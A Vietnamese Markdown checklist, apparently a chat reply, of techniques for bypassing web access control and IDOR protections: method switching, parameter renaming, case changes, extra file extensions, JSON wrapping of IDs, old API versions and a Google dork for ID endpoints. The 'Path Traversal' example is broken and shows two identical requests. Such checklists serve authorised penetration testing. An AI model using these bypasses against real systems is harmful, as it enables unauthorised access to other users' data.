
* [ ] **Thay đổi HTTP Method**

  ```
  GET /users/delete/victim_id  -> 403
  POST /users/delete/victim_id -> 200
  ```

* [ ] **Thay đổi tên tham số**

  ```
  GET /api/albums?album_id=<album_id>  
  => GET /api/albums?account_id=<account_id>
  ```

  🔥 *Tip:* Dùng Burp Extension **Paramalyzer** để lưu lại toàn bộ parameter đã gửi.

* [ ] **Path Traversal**

  ```
  POST /users/id           -> 403  
  POST /users/id   -> 200
  ```



* [ ] **Bypass kiểm tra phân quyền (Function Level Access Control)**

  ```
  GET /admin/profile   -> 401  
  GET /Admin/profile   -> 200  

  ```


  * Tìm các endpoint có chứa ID bị index trên Google:

    ```
    inurl:"/user?id=" site:target.com
    ```





* [ ] **Thay đổi loại file**

  ```
  GET /user_data/2341        -> 401  
  GET /user_data/2341.json   -> 200  
  GET /user_data/2341.xml    -> 200  
  GET /user_data/2341.config -> 200  
  GET /user_data/2341.txt    -> 200
  ```

* [ ] **Bọc ID trong mảng JSON**

  ```json
  {"userid": 123}        -> 401  
  {"userid": [123]}      -> 200
  ```

* [ ] **Bọc ID trong object JSON**

  ```json
  {"userid": 123}                 -> 401  
  {"userid": {"userid": 123}}    -> 200
  ```

* [ ] **Dùng version cũ của API**

  ```
  GET /v3/users_data/1234 -> 401  
  GET /v1/users_data/1234 -> 200
  ```


Muốn bu cập nhật thành checklist Markdown có thể chạy trong Burp hoặc ZAP thì nói bu nhé, bu sẽ convert.
